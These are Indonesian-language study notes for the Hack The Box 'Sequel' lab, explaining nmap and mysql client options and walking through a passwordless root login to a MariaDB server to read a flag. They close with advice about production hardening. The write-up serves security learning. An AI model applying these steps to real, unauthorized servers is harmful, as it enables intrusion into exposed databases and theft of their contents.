# === HTB Sequel - Lab Notes ===
### [11 Mar 2026] — MySQL Enumeration & Exploitation

---

## 📌 TOOLS YANG DIPAKAI
```
nmap    → scan port & deteksi service
mysql   → MySQL/MariaDB command line client
ping    → cek koneksi ke target aktif/tidak
```

---

## 📌 SWITCH & FUNGSI — NMAP
```
-sV          → deteksi versi service yang berjalan
-sC          → jalankan default NSE scripts
-T4          → speed scan (1=lambat, 5=cepat)
-p 3306      → scan port spesifik
-p-          → scan semua port (1-65535)
-oN file.txt → simpan hasil ke file

Gabungan rekomendasi HTB :
nmap -sV -sC -T4 <IP>
```

---

## 📌 SWITCH & FUNGSI — MYSQL CLIENT
```
-u <user>    → tentukan username login
-h <host>    → tentukan IP / hostname target
-p           → prompt input password
--skip-ssl   → koneksi tanpa enkripsi SSL

Contoh lengkap :
mysql -u root -h 10.129.16.112 --skip-ssl
```

---

## 📌 PERINTAH NAVIGASI DI MYSQL SHELL
```sql
help;                    -- tampilkan daftar perintah (shortcut: \h)
show databases;          -- lihat semua database
use nama_database;       -- masuk ke database tertentu
show tables;             -- lihat semua tabel dalam database aktif
select * from tabel;     -- tampilkan semua isi tabel
exit / quit / Ctrl+D     -- keluar dari MySQL shell
```

---

## 📌 SHORTCUT DI DALAM MYSQL SHELL
```
\h  → help (tampilkan menu bantuan)
\u  → use  (ganti/pilih database)
\q  → quit (keluar)
\s  → status (info koneksi server)
\!  → jalankan perintah system shell
```

---

## 📌 CARA CARI BANTUAN TOOL DI LINUX
```bash
tool --help      # bantuan singkat dari luar tool (terminal)
tool -h          # versi pendek --help
man tool         # manual lengkap
help;            # dari DALAM MySQL shell
```
```
⚠️  PENTING BEDAKAN :
    -u (terminal)     = flag username saat LOGIN
    \u (mysql shell)  = shortcut perintah USE (ganti database)
    --help (terminal) = cari info SEBELUM masuk tool
    help; (di shell)  = cari info SETELAH masuk tool
```

---

## 📌 ALUR EKSPLOITASI — SEQUEL
```
1. ping -c 4 <IP>
   → pastikan target hidup & VPN konek

2. nmap -sV -sC -T4 <IP>
   → temukan port 3306 = MySQL terbuka

3. mysql -u root -h <IP> --skip-ssl
   → coba login tanpa password (misconfiguration)
   → berhasil masuk = MariaDB [(none)]> muncul

4. show databases;
   → lihat ada database apa

5. use htb;
   → masuk database target

6. show tables;
   → ketemu tabel: config, users

7. select * from config;
   → FLAG ada di row "flag" kolom "value" ✓
```

---

## 📌 KONSEP PENTING
```
Port 3306        = port default MySQL / MariaDB
Misconfiguration = root tanpa password → celah umum di server lalai
SSL Error 2026   = server tidak support SSL → fix dengan --skip-ssl
MariaDB          = fork open source dari MySQL, syntax sama
Flag HTB         = string hash di dalam database sebagai bukti eksploitasi
VPN HTB          = wajib konek dulu sebelum bisa akses target lab
```

---

## 📌 PERBEDAAN KUNCI
```
MySQL vs MariaDB   → beda produk tapi syntax & port SAMA (3306)
-p (nmap)          → tentukan port yang mau di-scan
-p (mysql)         → prompt password login
show databases     → lihat LIST database (belum masuk)
use database       → MASUK ke database tertentu
select * from X    → baca ISI tabel X
```

---

## ⚠️ CATATAN KEAMANAN
```
✗  Root tanpa password = SANGAT BERBAHAYA di production
✗  Port 3306 expose ke internet publik = celah besar
✓  Di HTB/lab = sengaja misconfigured untuk tujuan belajar
✓  Selalu praktik di environment legal (HTB, lab sendiri)
✓  Di dunia nyata → selalu gunakan password kuat + firewall port DB
```